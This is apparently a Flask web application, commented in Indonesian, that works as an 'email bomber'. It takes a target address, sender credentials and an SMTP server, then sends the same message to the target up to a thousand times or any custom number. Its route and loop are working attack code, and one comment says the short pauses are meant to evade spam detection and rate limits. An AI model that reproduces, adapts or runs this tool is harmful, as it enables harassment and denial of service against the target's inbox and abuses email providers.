from flask import Flask, render_template, request, flash, redirect, url_for
import smtplib
import sys
import time
# import uuid # Dihapus, karena Anda tidak ingin Message-ID unik

app = Flask(__name__)
# PASTIKAN untuk mengganti kunci rahasia ini dengan string acak dan kuat untuk produksi
app.secret_key = 'your_super_secret_key_here_please_change_this_for_production_safety' # Ganti ini!

@app.route('/')
def index():
    """Renders the main page with the email bombing form."""
    return render_template('index.html')

@app.route('/bomb_email', methods=['POST'])
def bomb_email():
    """Handles the form submission and initiates the email bombing process."""
    if request.method == 'POST':
        # --- Bagian ini mengadaptasi logika dari EmailBomber.__init__() ---
        target = request.form.get('target_email')
        try:
            mode = int(request.form.get('bomb_mode'))
        except (ValueError, TypeError):
            flash("Mode Bomb tidak valid. Harap pilih salah satu opsi.", 'error')
            return redirect(url_for('index'))

        custom_amount = request.form.get('custom_amount')
        attacker_email = request.form.get('attacker_email')
        attacker_password = request.form.get('attacker_password')
        
        # Subjek akan selalu nilai default yang telah kita tetapkan, tidak diambil dari form
        current_subject = "Pesan Penting" 
            
        message = request.form.get('message') # Konten pesan saja
        server_choice = request.form.get('email_server')

        # --- Validasi input dasar (subjek tidak lagi wajib di sini) ---
        if not all([target, attacker_email, attacker_password, message, server_choice]):
            flash("Kolom Target Email, Sender Email, Sender Password, dan Email Message harus diisi.", 'error')
            return redirect(url_for('index'))

        if target == attacker_email:
            flash("ERROR: Tidak bisa menggunakan alamat email penyerang dan target yang sama.", 'error')
            return redirect(url_for('index'))

        # --- Bagian ini mengadaptasi logika dari EmailBomber.bomb() ---
        amount = 0
        if mode == 1:
            amount = 1000
        elif mode == 2:
            amount = 500
        elif mode == 3:
            amount = 250
        elif mode == 4:
            try:
                if not custom_amount:
                    flash("Jumlah kustom harus diisi jika mode kustom dipilih.", 'error')
                    return redirect(url_for('index'))
                amount = int(custom_amount)
                if amount <= 0:
                    flash("Jumlah kustom harus lebih besar dari 0.", 'error')
                    return redirect(url_for('index'))
            except ValueError:
                flash("Jumlah kustom tidak valid. Harap masukkan angka.", 'error')
                return redirect(url_for('index'))
        else:
            flash("Mode Bomb tidak valid.", 'error')
            return redirect(url_for('index'))

        # --- Bagian ini mengadaptasi logika dari EmailBomber.email() ---
        server = ''
        port = 587 # Default port for TLS
        if server_choice == '1':
            server = 'smtp.gmail.com'
        elif server_choice == '2':
            server = 'smtp.mail.yahoo.com'
        elif server_choice == '3':
            server = 'smtp-mail.outlook.com'
        elif server_choice == '4':
            server = request.form.get('custom_server')
            try:
                port = int(request.form.get('custom_port'))
            except (ValueError, TypeError):
                flash("Port kustom tidak valid. Harap masukkan angka.", 'error')
                return redirect(url_for('index'))
            if not server:
                flash("Alamat server kustom harus diisi.", 'error')
                return redirect(url_for('index'))
        else:
            flash("Pilihan server email tidak valid.", 'error')
            return redirect(url_for('index'))

        # --- Bagian ini mengadaptasi logika dari EmailBomber.attack() dan EmailBomber.send() ---
        try:
            s = smtplib.SMTP(server, port)
            s.ehlo()
            s.starttls() # Secure the connection
            s.ehlo() # Re-identify after TLS
            s.login(attacker_email, attacker_password)

            sent_count = 0
            for i in range(amount):
                # Kirim hanya konten pesan, seperti di email_bomber_v2.0.py asli
                s.sendmail(attacker_email, target, message) 

                sent_count += 1

                # Simulasi jeda jika diperlukan untuk menghindari deteksi spam / rate limiting
                if sent_count % 50 == 0 and sent_count != amount:
                    time.sleep(0.5) # Jeda singkat setelah setiap 50 email

            s.quit() # Tutup koneksi SMTP dengan benar
            flash(f"Berhasil membomb {sent_count} email ke {target}!", 'success')
            return redirect(url_for('index'))

        except smtplib.SMTPAuthenticationError as e:
            flash(f"Kesalahan Autentikasi SMTP: Pastikan email dan password benar, dan jika menggunakan Gmail, izinkan 'Less secure app access' atau gunakan App Password. Detail: {e}", 'error')
            return redirect(url_for('index'))
        except smtplib.SMTPConnectError as e:
            flash(f"Kesalahan Koneksi SMTP: Tidak dapat terhubung ke server email. Pastikan server dan port benar serta tidak ada blokir firewall. Detail: {e}", 'error')
            return redirect(url_for('index'))
        except smtplib.SMTPException as e:
            flash(f"Terjadi kesalahan SMTP: {e}", 'error')
            return redirect(url_for('index'))
        except Exception as e:
            flash(f"Terjadi kesalahan tak terduga: {e}", 'error')
            return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True, port=5000)